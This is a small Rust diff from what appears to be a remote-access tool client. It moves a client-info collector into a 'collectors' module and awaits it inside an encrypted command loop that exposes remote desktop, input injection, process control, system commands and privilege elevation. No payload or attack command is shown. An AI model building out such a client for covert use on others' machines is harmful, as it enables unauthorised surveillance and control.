@@ -1,4 +1,5 @@
-use crate::features::other::{client_info, visit_website, show_messagebox, elevate_client};
+use crate::features::other::{visit_website, show_messagebox, elevate_client};
+use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::system_commands::system_commands;
@@ -34,7 +35,7 @@ pub async fn reading_loop(
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::InitClient)) => {
-                let client_info = client_info(config.group.clone());
+                let client_info = client_info(config.group.clone()).await;
                 
                 match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                     Ok(_) => println!("Sent client info to server"),
